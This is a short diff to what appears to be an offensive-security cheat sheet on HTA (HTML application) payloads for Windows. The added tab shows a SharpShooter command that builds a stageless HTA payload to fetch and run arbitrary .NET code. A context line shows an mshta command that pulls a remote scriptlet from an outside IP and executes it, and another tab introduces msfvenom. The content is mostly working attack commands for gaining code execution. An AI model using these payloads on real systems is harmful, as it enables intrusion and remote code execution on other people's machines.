@@ -62,6 +62,14 @@ cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec()
 ```
 {% endtab %}
 
+{% tab title="SharpShooter" %}
+Using [SharpShooter](https://github.com/mdsecactivebreach/SharpShooter/tree/master), we can create a payload that will retrieve and execute arbitrary CSharp source code (.NET).
+
+```bash
+python2 SharpShooter.py --payload hta --rawscfile ~/sharpshooter.raw --dotnetver 2  --output test --stageless
+```
+{% endtab %}
+
 {% tab title="msfvenom" %}
 We can use the msfvenom framework to generate hta files.
 
